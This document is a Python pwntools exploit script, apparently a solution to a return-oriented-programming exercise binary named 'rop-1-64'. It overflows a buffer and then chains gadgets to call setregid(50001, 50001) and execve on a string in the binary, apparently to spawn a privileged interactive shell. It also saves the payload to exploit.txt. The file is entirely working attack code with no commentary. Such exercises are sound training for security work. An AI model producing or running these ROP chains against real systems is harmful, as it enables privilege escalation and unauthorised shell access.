
#!/usr/bin/env python
from pwn import *
import os

p = process("./rop-1-64")

"""
0x0000000000400560  execve@plt
0x0000000000400570  prctl@plt
0x0000000000400580  setregid@plt
"""

execve = p64(0x400560)
setregid = p64(0x400580)

"""
0x00000000004007e3 : pop rdi ; ret
0x00000000004006d8 : pop rdx ; nop ; pop rbp ; ret
0x00000000004007e1 : pop rsi ; pop r15 ; ret
"""

pop_rdi_ret = p64(0x4007e3)
pop_rdx_nop_pop_rbp_ret = p64(0x4006d8)
pop_rsi_r15_ret = p64(0x4007e1)

buf = "A" * 0x80 + "A" * 8

# setregid(50001, 50001)
buf += pop_rdi_ret
buf += p64(50001)
buf += pop_rsi_r15_ret
buf += p64(50001)
buf += p64(50001)
buf += setregid

# execve(string, 0, 0)
string = p64(0x400740)

buf += pop_rdi_ret
buf += string
buf += pop_rsi_r15_ret
buf += p64(0)
buf += p64(0)
buf += pop_rdx_nop_pop_rbp_ret
buf += p64(0)
buf += p64(10)
buf += execve

with open("exploit.txt", "wb") as f:
        f.write(buf)


p.sendline(buf)
p.interactive()
